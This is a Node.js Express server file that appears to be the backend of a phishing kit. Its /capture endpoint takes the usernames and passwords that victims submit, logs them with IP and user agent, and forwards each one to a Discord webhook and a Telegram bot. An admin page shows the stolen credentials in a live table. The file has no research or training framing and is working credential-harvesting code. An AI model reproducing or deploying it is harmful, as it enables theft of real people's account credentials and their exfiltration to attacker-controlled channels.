require('dotenv').config();
const express = require('express');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const app = express();

app.use(express.json());
app.use(cookieParser());
app.use(express.static('public'));

const LOG = path.join('/tmp', 'captures.log');
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(16).toString('hex');

const ADMIN_USER = process.env.ADMIN_USER || 'null_admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'changeme_0xDEAD';
const ADMIN_KEY  = process.env.ADMIN_KEY  || crypto.randomBytes(8).toString('hex');

const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
const TELEGRAM_TOKEN  = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT   = process.env.TELEGRAM_CHAT;

function pushDiscord(data) {
  if (!DISCORD_WEBHOOK) return;
  const body = {
    username: 'rack-watch',
    embeds: [{
      title: '🎣 capture',
      color: 0x4a90e2,
      fields: [
        { name: 'user', value: '```' + (data.user || '(empty)') + '```', inline: true },
        { name: 'pass', value: '```' + (data.pass || '(empty)') + '```', inline: true },
        { name: 'ip',   value: '`' + data.ip + '`', inline: false },
        { name: 'ua',   value: '`' + (data.ua || 'n/a').slice(0, 200) + '`', inline: false }
      ],
      timestamp: new Date(data.ts).toISOString()
    }]
  };
  fetch(DISCORD_WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  }).catch(() => {});
}

function pushTelegram(data) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT) return;
  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT,
      text: `🎣 capture\nIP: ${data.ip}\nuser: ${data.user}\npass: ${data.pass}`
    })
  }).catch(() => {});
}

function logCapture(data) {
  const line = `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`;
  try { fs.appendFileSync(LOG, line); } catch (_) {}
  pushDiscord(data);
  pushTelegram(data);
}

function isAdmin(req) {
  return req.cookies && req.cookies.rack_session === SESSION_SECRET;
}

app.post('/capture', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const user = (req.body.user || '').slice(0, 200);
  const pass = (req.body.pass || '').slice(0, 200);

  if (user === ADMIN_USER && pass === ADMIN_PASS) {
    res.cookie('rack_session', SESSION_SECRET, {
      httpOnly: true, sameSite: 'lax', maxAge: 1000 * 60 * 60 * 24 * 30
    });
    return res.json({ ok: true, redirect: '/admin' });
  }

  logCapture({ ip, ua: req.headers['user-agent'] || '', user, pass, ts: Date.now() });
  res.json({ ok: true });
});

app.get('/admin', (req, res) => {
  if (!isAdmin(req)) return res.status(403).send('nope');
  const adminHtml = `<!doctype html><html><head><meta charset="utf-8">
<title>rack · live</title>
<style>
  body{margin:0;background:#0f1115;color:#e6e6e6;font-family:monospace;padding:20px}
  h1{font-size:16px;color:#4a90e2;margin:0 0 16px}
  table{border-collapse:collapse;width:100%;font-size:13px}
  th,td{border-bottom:1px solid #2a2f3a;padding:8px 10px;text-align:left;vertical-align:top}
  th{color:#8a8f99;font-weight:600}
  td.user{color:#7dd87d} td.pass{color:#e26a6a}
  .empty{color:#8a8f99;padding:20px 0}
</style></head><body>
<h1>🎣 live captures</h1>
<div id="wrap">loading…</div>
<script>
async function tick(){
  const r = await fetch('/admin/logs?key=${ADMIN_KEY}');
  const t = await r.text();
  const rows = t.trim().split('\\n').filter(Boolean).map(l=>{
    try{ const m = l.match(/\\[([^\\]]+)\\] (\\{.*\\})/); const d = JSON.parse(m[2]);
      return '<tr><td>' + new Date(d.ts).toLocaleTimeString() + '</td><td class="user">' + (d.user||'') + '</td><td class="pass">' + (d.pass||'') + '</td><td>' + (d.ip||'') + '</td><td style="color:#8a8f99">' + (d.ua||'').slice(0,60) + '</td></tr>';
    }catch(e){return ''}
  }).reverse().join('');
  document.getElementById('wrap').innerHTML = rows
    ? '<table><tr><th>time</th><th>user</th><th>pass</th><th>ip</th><th>ua</th></tr>' + rows + '</table>'
    : '<div class="empty">no captures yet — waiting</div>';
}
tick(); setInterval(tick, 3000);
</script></body></html>`;
  res.send(adminHtml);
});

app.get('/admin/logs', (req, res) => {
  if (!isAdmin(req) && req.query.key !== ADMIN_KEY) return res.status(403).send('nope');
  res.type('text/plain').send(fs.existsSync(LOG) ? fs.readFileSync(LOG, 'utf8') : '');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('rack-warm on :' + PORT));